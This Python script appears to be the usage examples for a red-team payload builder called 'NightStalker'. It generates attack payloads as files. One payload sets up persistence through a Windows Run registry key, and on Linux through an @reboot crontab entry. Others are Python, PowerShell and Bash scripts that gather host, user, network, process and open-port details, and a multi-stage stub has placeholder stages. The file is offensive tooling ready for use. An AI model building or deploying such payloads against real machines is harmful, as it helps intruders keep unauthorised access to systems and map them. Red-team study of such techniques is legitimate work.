#!/usr/bin/env python3
"""
NightStalker Payload Building Examples
Demonstrates how to build various types of payloads
"""

import os
import sys
from pathlib import Path

# Add the current directory to Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from nightstalker.redteam.payload_builder import PayloadBuilder, PayloadConfig

def main():
    """Build example payloads"""
    print("NightStalker Payload Builder Examples")
    print("=" * 40)
    
    # Create output directory
    output_dir = Path("output/payloads")
    output_dir.mkdir(parents=True, exist_ok=True)
    
    # Initialize payload builder
    builder = PayloadBuilder()
    
    # Example 1: Basic Reconnaissance Payload
    print("\n1. Building Reconnaissance Payload...")
    recon_code = '''
import platform
import os
import subprocess
import socket

def recon():
    """Basic system reconnaissance"""
    info = {
        'hostname': platform.node(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.machine(),
        'username': os.getenv('USERNAME') or os.getenv('USER'),
        'current_dir': os.getcwd(),
        'ip_address': socket.gethostbyname(socket.gethostname())
    }
    
    print("=== System Information ===")
    for key, value in info.items():
        print(f"{key}: {value}")
    
    # Network interfaces
    try:
        if platform.system() == 'Windows':
            result = subprocess.run(['ipconfig'], capture_output=True, text=True)
        else:
            result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        print(f"\\n=== Network Configuration ===")
        print(result.stdout[:500] + "..." if len(result.stdout) > 500 else result.stdout)
    except:
        print("Could not retrieve network information")
    
    return info

if __name__ == "__main__":
    recon()
'''
    
    try:
        recon_path = builder.build_payload(
            payload_type="recon",
            payload_code=recon_code,
            output_format="python",
            output_path=str(output_dir / "recon_payload.py"),
            metadata={'description': 'Basic system reconnaissance'}
        )
        print(f"✓ Recon payload built: {recon_path}")
    except Exception as e:
        print(f"✗ Failed to build recon payload: {e}")
    
    # Example 2: Persistence Payload
    print("\n2. Building Persistence Payload...")
    persistence_code = '''
import os
import platform
import subprocess
import time

def setup_persistence():
    """Setup persistence mechanism"""
    if platform.system() == "Windows":
        # Windows persistence via registry
        try:
            startup_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            script_path = os.path.abspath(__file__)
            cmd = f'reg add "HKCU\\\\{startup_key}" /v "NightStalker" /t REG_SZ /d "{script_path}" /f'
            subprocess.run(cmd, shell=True, check=True)
            print(f"✓ Windows persistence set: {script_path}")
        except Exception as e:
            print(f"✗ Windows persistence failed: {e}")
    else:
        # Linux persistence via crontab
        try:
            script_path = os.path.abspath(__file__)
            cron_entry = f"@reboot python3 {script_path}\\n"
            with open("/tmp/nightstalker_cron", "w") as f:
                f.write(cron_entry)
            subprocess.run(["crontab", "/tmp/nightstalker_cron"], check=True)
            os.remove("/tmp/nightstalker_cron")
            print(f"✓ Linux persistence set: {script_path}")
        except Exception as e:
            print(f"✗ Linux persistence failed: {e}")

if __name__ == "__main__":
    setup_persistence()
'''
    
    try:
        persistence_path = builder.build_payload(
            payload_type="persistence",
            payload_code=persistence_code,
            output_format="python",
            output_path=str(output_dir / "persistence_payload.py"),
            metadata={'description': 'System persistence mechanism'}
        )
        print(f"✓ Persistence payload built: {persistence_path}")
    except Exception as e:
        print(f"✗ Failed to build persistence payload: {e}")
    
    # Example 3: PowerShell Payload
    print("\n3. Building PowerShell Payload...")
    powershell_code = '''
# NightStalker PowerShell Reconnaissance
function Get-SystemInfo {
    $info = @{
        Hostname = $env:COMPUTERNAME
        OS = $env:OS
        User = $env:USERNAME
        Domain = $env:USERDOMAIN
        CurrentDir = Get-Location
        IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*"}).IPAddress
    }
    
    Write-Host "=== System Information ==="
    $info.GetEnumerator() | ForEach-Object {
        Write-Host "$($_.Key): $($_.Value)"
    }
    
    # Network interfaces
    Write-Host "`n=== Network Configuration ==="
    Get-NetAdapter | Format-Table -AutoSize
    
    return $info
}

# Execute reconnaissance
Get-SystemInfo
'''
    
    try:
        ps_path = builder.build_payload(
            payload_type="powershell_recon",
            payload_code=powershell_code,
            output_format="powershell",
            output_path=str(output_dir / "powershell_recon.ps1"),
            metadata={'description': 'PowerShell reconnaissance script'}
        )
        print(f"✓ PowerShell payload built: {ps_path}")
    except Exception as e:
        print(f"✗ Failed to build PowerShell payload: {e}")
    
    # Example 4: Bash Payload
    print("\n4. Building Bash Payload...")
    bash_code = '''#!/bin/bash
# NightStalker Bash Reconnaissance

echo "=== System Information ==="
echo "Hostname: $(hostname)"
echo "OS: $(uname -s)"
echo "Kernel: $(uname -r)"
echo "Architecture: $(uname -m)"
echo "User: $(whoami)"
echo "Current Directory: $(pwd)"
echo "IP Address: $(hostname -I | awk '{print $1}')"

echo ""
echo "=== Network Interfaces ==="
ifconfig | grep -E "^[a-zA-Z0-9]+" | awk '{print $1}' | while read interface; do
    echo "Interface: $interface"
    ifconfig $interface | grep "inet " | awk '{print "  IP: " $2}'
done

echo ""
echo "=== Running Processes ==="
ps aux | head -10

echo ""
echo "=== Open Ports ==="
netstat -tuln | head -10
'''
    
    try:
        bash_path = builder.build_payload(
            payload_type="bash_recon",
            payload_code=bash_code,
            output_format="bash",
            output_path=str(output_dir / "bash_recon.sh"),
            metadata={'description': 'Bash reconnaissance script'}
        )
        print(f"✓ Bash payload built: {bash_path}")
    except Exception as e:
        print(f"✗ Failed to build Bash payload: {e}")
    
    # Example 5: Multi-stage Payload
    print("\n5. Building Multi-stage Payload...")
    stages = [
        {
            'code': 'print("Stage 1: Initial reconnaissance")',
            'conditional': 'True'
        },
        {
            'code': 'print("Stage 2: Network scanning")',
            'conditional': 'True'
        },
        {
            'code': 'print("Stage 3: Data collection")',
            'conditional': 'True'
        }
    ]
    
    try:
        multi_path = builder.build_multi_stage_payload(
            stages=stages,
            output_format="python"
        )
        print(f"✓ Multi-stage payload built: {multi_path}")
    except Exception as e:
        print(f"✗ Failed to build multi-stage payload: {e}")
    
    print(f"\n=== Summary ===")
    print(f"Payloads built in: {output_dir}")
    print("Available formats: python, powershell, bash")
    print("Available types: recon, persistence, multi-stage")
    
    # List available formats
    print(f"\nAvailable output formats: {builder.list_formats()}")

if __name__ == "__main__":
    main() 